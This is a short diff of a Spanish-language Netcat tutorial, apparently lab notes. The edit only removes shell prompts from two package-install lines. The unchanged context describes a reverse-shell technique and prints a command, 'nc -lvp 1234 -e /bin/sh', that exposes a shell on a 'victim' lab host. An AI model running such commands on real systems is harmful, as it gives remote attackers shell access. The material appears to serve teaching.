@@ -241,8 +241,8 @@ Se conoce como la “navaja suiza” de las redes porque es muy versátil y simp
 Una reverse shell con Netcat (ncat) es una técnica comúnmente usada para que un sistema remoto se conecte a tu máquina y te dé acceso a su terminal.
 
 # En la máquina de la víctima debian-12 192.168.33.11:
-$ sudo apt-get update -y
-$ sudo apt-get install netcat -y	
+sudo apt-get update -y
+sudo apt-get install netcat -y	
 
 nc -lvp 1234 -e /bin/sh &
 
